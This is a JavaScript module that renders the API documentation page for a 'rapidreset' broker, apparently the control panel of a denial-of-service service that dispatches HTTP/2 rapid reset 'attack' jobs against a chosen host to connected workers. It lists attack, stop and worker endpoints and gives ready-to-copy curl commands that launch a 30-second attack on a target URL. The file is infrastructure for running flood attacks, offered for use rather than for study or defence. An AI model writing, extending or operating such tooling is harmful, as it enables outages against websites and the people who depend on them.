function escapeHtml(value) {
    return String(value).replace(/[&<>"']/g, (char) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;',
    })[char]);
}

function renderDocs({ request, config, methods }) {
    const host = request.headers.host || `${config.host}:${config.port}`;
    const origin = `http://${host}`;
    const method = [...methods.values()][0] || { name: 'rapidreset' };

    const methodRows = [...methods.values()].map((entry) => `
      <tr>
        <td><code>${escapeHtml(entry.name)}</code></td>
        <td>${escapeHtml(entry.description || '-')}</td>
        <td><code>${escapeHtml(entry.argv.join(' '))}</code></td>
      </tr>`).join('');

    const endpoints = [
        ['GET, POST', '/api/attack', 'Submit a job (query string or JSON body)'],
        ['GET', '/api/attack/&lt;id&gt;', 'Job status'],
        ['POST', '/api/stop/&lt;id&gt;', 'Cancel a queued or running job'],
        ['GET', '/api/workers', 'Connected workers and queue depth'],
        ['GET', '/api/health', 'Uptime, worker count and queue depth'],
        ['GET + Upgrade', '/api/worker', 'Primary worker channel (token)'],
        ['POST', '/api/worker/signal', 'Fallback job channel (token)'],
        ['POST', '/api/worker/result', 'Worker result reporting (token)'],
    ].map(([verb, path, note]) => `
      <tr>
        <td><span class="verb">${escapeHtml(verb)}</span></td>
        <td><code>${path}</code></td>
        <td>${escapeHtml(note)}</td>
      </tr>`).join('');

    const authNote = config.apiToken
        ? 'Public endpoints require <code>x-api-token</code> (or <code>Authorization: Bearer</code>).'
        : 'Public endpoints are <strong>unauthenticated</strong>; set <code>API_TOKEN</code> to require a token.';

    return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="rapidreset orchestration broker API">
<title>rapidreset · broker</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body {
    margin: 0; padding: 32px 20px 64px;
    background: #0b0d10; color: #d6dae0;
    font: 15px/1.6 system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
  }
  main { max-width: 920px; margin: 0 auto; }
  h1 { font-size: 20px; margin: 0 0 4px; color: #f2f4f7; letter-spacing: .01em; }
  h2 { font-size: 12px; text-transform: uppercase; letter-spacing: .12em; color: #8b95a3; margin: 34px 0 10px; }
  p { margin: 0 0 12px; color: #a7b0bc; }
  .sub { color: #8b95a3; margin: 0; }
  .badge { display: inline-block; margin-left: 8px; padding: 1px 8px; border-radius: 999px; background: #13231a; color: #7ee2a8; font-size: 11px; letter-spacing: .06em; vertical-align: 2px; }
  .endpoint { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin: 16px 0 0; }
  .verb { display: inline-block; background: #1b7f4b; color: #eafff2; padding: 2px 8px; border-radius: 4px; font: 11px/1.5 ui-monospace, Consolas, monospace; letter-spacing: .06em; white-space: nowrap; }
  .wrap { overflow-x: auto; margin-top: 6px; }
  table { width: 100%; border-collapse: collapse; min-width: 540px; }
  th, td { text-align: left; padding: 9px 10px; border-bottom: 1px solid #1c2229; vertical-align: top; }
  th { color: #8b95a3; font-weight: 500; font-size: 12px; text-transform: uppercase; letter-spacing: .08em; }
  code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 13px; background: #12161b; border: 1px solid #1e252d; border-radius: 4px; padding: 1px 5px; color: #9fd3ff; overflow-wrap: anywhere; }
  .card { background: #101418; border: 1px solid #1c2229; border-radius: 8px; padding: 12px 14px; margin-bottom: 10px; }
  .label { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: #8b95a3; margin-bottom: 8px; }
  .row { display: flex; flex-wrap: wrap; gap: 8px; align-items: stretch; }
  .url { flex: 1 1 320px; min-width: 0; overflow-x: auto; white-space: nowrap; padding: 8px 10px; }
  button {
    flex: none; cursor: pointer; min-height: 44px; padding: 10px 16px; border-radius: 6px;
    background: #1c2229; color: #cfd6de; border: 1px solid #2a333d; font: inherit; font-size: 13px;
  }
  button:hover { background: #232b34; }
  button:focus-visible, a:focus-visible { outline: 2px solid #6fb3ff; outline-offset: 2px; }
  button.done { background: #1b7f4b; border-color: #249c5c; color: #eafff2; }
  pre { background: #101418; border: 1px solid #1c2229; border-radius: 8px; padding: 12px 14px; overflow-x: auto; margin: 0; font: 13px/1.6 ui-monospace, Consolas, monospace; }
  .muted { color: #8b95a3; }
  .warn { border-left: 2px solid #b8892a; padding-left: 12px; color: #e2c58a; }
  a { color: #6fb3ff; }
  @media (max-width: 520px) { body { padding: 24px 14px 48px; } .row { flex-direction: column; } button { width: 100%; } }
</style>
</head>
<body>
<main>
  <h1>rapidreset · broker <span class="badge">online</span></h1>
  <p class="sub">HTTP/2 rapid reset orchestration. Submit a job here; a connected worker executes it.</p>

  <div class="endpoint">
    <span class="verb">GET, POST</span>
    <code>${escapeHtml(origin)}/api/attack?host=&amp;time=&amp;method=</code>
  </div>

  <h2>Endpoints</h2>
  <div class="wrap">
    <table>
      <tr><th>method</th><th>path</th><th>purpose</th></tr>
      ${endpoints}
    </table>
  </div>

  <h2>Submit a job</h2>
  <div class="wrap">
    <table>
      <tr><th>parameter</th><th>required</th><th>notes</th></tr>
      <tr><td><code>host</code></td><td>yes</td><td>http(s) URL, no whitespace, max 2048 chars</td></tr>
      <tr><td><code>time</code></td><td>yes</td><td>integer seconds, 1–${config.maxAttackTime}; legacy alias <code>itme</code> still accepted</td></tr>
      <tr><td><code>method</code></td><td>yes</td><td>one of: ${escapeHtml([...methods.keys()].join(', ') || '(none)')}</td></tr>
    </table>
  </div>

  <div class="card">
    <div class="label">query string</div>
    <div class="row">
      <code class="url" data-copy>curl "${escapeHtml(origin)}/api/attack?host=https://target.com&amp;time=30&amp;method=${escapeHtml(method.name)}"</code>
      <button type="button" data-copy-btn aria-label="copy query example">copy</button>
    </div>
  </div>

  <div class="card">
    <div class="label">json body</div>
    <div class="row">
      <code class="url" data-copy>curl -X POST "${escapeHtml(origin)}/api/attack" -H "content-type: application/json" -d '{"host":"https://target.com","time":30,"method":"${escapeHtml(method.name)}"}'</code>
      <button type="button" data-copy-btn aria-label="copy JSON example">copy</button>
    </div>
  </div>

  <h2>202 response</h2>
  <pre>{
  "ok": true,
  "id": "4b7d1c2e-...",
  "status": "dispatched",   // or "queued" when no worker is idle
  "worker": "node-01-1234-ab12cd",
  "method": "${escapeHtml(method.name)}",
  "host": "https://target.com/",
  "time": 30,
  "statusUrl": "/api/attack/4b7d1c2e-..."
}</pre>

  <h2>Job lifecycle</h2>
  <p><code>dispatched</code> → <code>running</code> → <code>stopping</code> → <code>404</code>.
  A finished, failed or cancelled job is removed from the broker, so status returns
  <code>404</code>. Poll <code>/api/attack/&lt;id&gt;</code> while the job is queued or running.</p>

  <h2>Stop a job</h2>
  <pre>POST ${escapeHtml(origin)}/api/stop/&lt;id&gt;</pre>
  <p class="muted">A queued job is removed immediately. A running job receives a cancel command;
  its slot is released when the worker reports back, or after ${config.cancelTimeoutMs / 1000}s.</p>

  <h2>Methods</h2>
  <div class="wrap">
    <table>
      <tr><th>name</th><th>description</th><th>argv</th></tr>
      ${methodRows || '<tr><td colspan="3" class="muted">(none loaded)</td></tr>'}
    </table>
  </div>

  <h2>Errors</h2>
  <div class="wrap">
    <table>
      <tr><th>code</th><th>meaning</th></tr>
      <tr><td>400</td><td>missing/duplicate parameter, invalid URL, time out of range, unknown method, oversized body</td></tr>
      <tr><td>401</td><td>API token required or wrong</td></tr>
      <tr><td>404</td><td>unknown route, unknown job, or job already finished</td></tr>
      <tr><td>405</td><td>wrong HTTP method (see the <code>allow</code> header)</td></tr>
      <tr><td>503</td><td>queue full; retry after 10s (<code>retry-after: 10</code>)</td></tr>
    </table>
  </div>

  <h2>Security</h2>
  <p class="warn">${authNote} Worker transports additionally require <code>CLIENT_TOKEN</code> when set.
  Anyone who can reach this port can submit or stop jobs when <code>API_TOKEN</code> is empty.</p>
</main>
<script>
  (function () {
    const live = document.createElement('p');
    live.setAttribute('aria-live', 'polite');
    live.className = 'muted';
    live.hidden = true;
    document.body.appendChild(live);

    async function copy(text) {
      if (window.isSecureContext && navigator.clipboard) {
        try { await navigator.clipboard.writeText(text); return true; } catch {}
      }
      const area = document.createElement('textarea');
      area.value = text;
      area.setAttribute('readonly', '');
      area.style.position = 'fixed';
      area.style.opacity = '0';
      document.body.appendChild(area);
      area.select();
      let ok = false;
      try { ok = document.execCommand('copy'); } catch {}
      area.remove();
      return ok;
    }

    document.addEventListener('click', async (event) => {
      const button = event.target.closest('[data-copy-btn]');
      if (!button) return;
      const row = button.closest('.row');
      const source = row && row.querySelector('[data-copy]');
      if (!source) return;

      const ok = await copy(source.textContent.trim());
      const label = button.textContent;
      button.textContent = ok ? 'copied' : 'select & copy';
      button.classList.toggle('done', ok);
      live.hidden = false;
      live.textContent = ok ? 'Copied to clipboard' : 'Copy blocked; text is selected';
      if (!ok) {
        const range = document.createRange();
        range.selectNodeContents(source);
        const selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
      }
      setTimeout(() => {
        button.textContent = label;
        button.classList.remove('done');
      }, 1600);
    });
  })();
</script>
</body>
</html>`;
}

module.exports = { renderDocs };